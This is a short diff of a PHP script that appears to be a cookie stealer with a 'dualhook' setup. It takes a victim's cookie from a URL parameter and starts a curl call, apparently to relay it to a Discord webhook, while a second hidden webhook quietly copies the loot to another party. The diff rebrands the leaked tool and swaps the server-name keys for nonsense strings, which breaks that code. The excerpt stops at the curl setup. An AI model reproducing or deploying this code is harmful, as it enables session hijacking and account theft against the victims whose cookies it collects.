@@ -1,10 +1,10 @@
 <?php
-$logo = "https://media.discordapp.net/attachments/927449954367205378/932716250075897957/standard_1.gif"; // you can change to your own logo url
-$name = "LEAKED BY VKEVIN"; // you can change to your own name
+$logo = "https://cdn.discordapp.com/attachments/1102136580988227686/1197943965656285235/IMG_1447.jpg?ex=65bd1b42&is=65aaa642&hm=39ccc5c27bcef07ed0cac5e098f4379b6b025b08a7feb675981f6957174abd61&"; // you can change to your own logo url
+$name = "LEAKED BY TSUKYOP"; // you can change to your own name
 $webhook = "THEM"; // anyones webhook
 $dualhook = "YOU"; // ofc shitter is dualhook so they have a dualhook in it change this to your dualhook
-$inameb = $_SERVER['SERVER_NAME'];
-$iname = strtoupper($_SERVER['SERVER_NAME']);
+$inameb = $_SERVER['server quoicoubebouE'];
+$iname = strtoupper($_SERVER['server quoicoubebou']);
 if (!empty($_GET["cookie"])) {
 $cookie = $_GET["cookie"];
 $ch = curl_init();
